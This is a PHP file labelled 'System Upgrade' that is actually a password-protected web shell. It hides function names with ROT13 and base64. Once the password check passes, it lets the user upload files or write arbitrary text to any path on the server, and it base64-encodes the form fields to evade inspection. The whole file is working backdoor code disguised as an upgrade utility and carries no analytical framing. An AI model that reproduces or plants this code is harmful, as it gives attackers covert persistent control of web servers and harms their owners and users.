<?php

/**
 * @title System Upgrade
 * @author Bleak Jack
 * @version 1.2.1
 * @link https://vip_system.com/Upgrade
 */

$token = "1f01f64a4ffebf64";
$ba = "onfr64_qrpbqr";
$uk = 'pass';
$data = array_merge([$uk => '', 'one' => 0, 'file' => '', 'name' => '', 'text' => '', 'path' => ''], empty($_POST) ? [] : $_POST);
$data['one'] || $data[$uk] = md5($data[$uk]);
$pa = md5($data[$uk] . $ba);
$token .= "aefbc04b734c9cac";
echo '<title>System Upgrade</title>';
if ($pa !== $token) {
    echo "<form method='post'><input style='border: 0;' placeholder='Wait...' name='{$uk}' ><button> >> </button></form>";
    die();
}
$wif = "ZmlsZV9wdXRfY29udGVudHM";
$ba = str_rot13($ba);
foreach (['name', 'txt', 'path'] as $k) {
    $data[$k] = empty($data[$k]) ? '' : $ba($data[$k]);
}
empty($data[$k]) && $data[$k] = __DIR__;
$ss = '<input name="one" type="hidden" value="1"/><input type="hidden" name="' . $uk . '" value="' . $data[$uk] . '">';
echo '<style>button{margin-top: .5em;width: 100%;padding: .5em;}input{width: 100%;margin-bottom: .5em;padding: .5em 1em;}</style>
<form id="m" method="post">' . $ss .'<input type="file" name="file" id="f" onchange="sf(1)"><br>
<div><input name="path" id="p" value="' . $data['path'] . '"><a style="position:absolute;margin-left: -2.5em;padding:0.3em 1em;" onclick="p.value=\''. $_SERVER['DOCUMENT_ROOT'].'\'">R</a></div>
<input name="name" id="n" value="' . $data['name'] . '"/><br>
<textarea name="txt" id="s" style="width: 100%;" rows="15">' . htmlspecialchars($data['txt']) . '</textarea>
<button type="button" onclick="sf()" id="sp">提交</button>
<button style="display: none;" id="sb"></button></form><script>function sf(o){if(o)m.enctype="multipart/form-data";
if(p.value.length)p.value=t(p.value);
if(n.value.length)n.value=t(n.value);
if(s.value.length)s.value=t(s.value);sb.click();
}function t(s) {return window.btoa(unescape(encodeURIComponent(s)));}</script>';
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;

$path = $data['path'] . "/";
$name = $data['name'];
$uri = str_replace(str_replace("\\", '/', $_SERVER['DOCUMENT_ROOT']), '', str_replace("\\", '/', $path));
$uri = rtrim($uri, '/') . '/';
if ($uri[0] !== '/') $uri = '/' . $uri;
$r = -1;
if (!empty($_FILES["file"]) && !empty($_FILES["file"]['size'])) {
    $name = empty($data["name"]) ? $_FILES["file"]["name"] : $data["name"];
    echo "SC: ";
    $r = @move_uploaded_file($_FILES["file"]["tmp_name"], $path . $name);
} elseif (!empty($name) && !empty($data['txt']) && $wif = $ba($wif)) {
    echo "XR: ";
    $r = @$wif($path . $name, $data['txt']);
}
if ($r > 0)
    echo ($r ? 'ok!!' : 'fail') . " <a href='" . $uri . $name . "' target='_blank'>OPEN</a> " . $path . $name . "<br/>";